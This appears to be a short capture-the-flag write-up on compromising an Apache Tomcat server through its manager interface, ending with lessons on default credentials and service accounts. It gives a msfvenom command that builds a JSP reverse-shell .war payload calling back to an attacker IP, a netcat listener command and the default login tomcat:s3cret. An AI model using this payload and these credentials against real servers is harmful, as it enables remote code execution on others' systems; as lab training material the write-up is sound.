The website allows upload of .war files to create new webpage. Using msfvenom to create a .war payload is the best exploitation approach to exploit the machine.

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.58 LPORT=1997 -f war > jerry.war

Proof of concept:

Create a netcat Listener on port 1997

nc -nvlp 1997

After signing in with the acquired credentials, scroll to the deploy section and upload the jerry.war file.

Lessons Learned

  1. Default credentials are a critical risk, tomcat:s3cret grants full manager access.
  1. Tomcat service accounts should never run as SYSTEM. Always run as a low-privileged user.
  1. WAR deployment is an easy RCE vector if the manager interface is exposed and poorly configured.
